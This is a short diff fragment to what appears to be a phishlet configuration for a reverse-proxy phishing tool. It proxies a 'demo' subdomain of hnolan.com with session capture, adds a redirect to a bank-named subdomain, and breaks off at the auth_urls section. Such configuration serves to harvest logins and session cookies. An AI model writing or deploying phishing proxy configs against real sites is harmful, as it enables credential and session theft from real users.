@@ -1,4 +1,5 @@
 min_ver: '3.0.0'
+redirect_url: 'https://bank.hnolan.com'
 proxy_hosts:
   - {phish_sub: 'demo', orig_sub: 'demo', domain: 'hnolan.com', session: true, is_landing: true}
 auth_urls:
